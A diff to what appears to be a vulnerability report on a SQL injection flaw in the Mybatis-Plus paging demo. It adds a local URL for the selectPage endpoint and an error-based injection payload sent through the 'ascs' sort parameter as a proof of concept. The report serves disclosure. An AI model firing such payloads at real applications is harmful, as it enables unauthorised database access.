@@ -32,9 +32,13 @@ Use the paging Demo code officially provided by Mybatis-Plus, and the database u
 
 1. Access Demo code selectPage interface
 
+http://127.0.0.1:8081/user/selectPage
+
 ![image](https://user-images.githubusercontent.com/40931609/115806523-80faf480-a419-11eb-908e-035d5a9c3603.png)
 
 2. Use the sql injection payload
+
+http://127.0.0.1:8081/user/selectPage?ascs=extractvalue(1,concat(char(126),md5(123)))&ascs=1
 
 ![image](https://user-images.githubusercontent.com/40931609/115806581-9f60f000-a419-11eb-81ee-1d6c85c3e3d6.png)
 
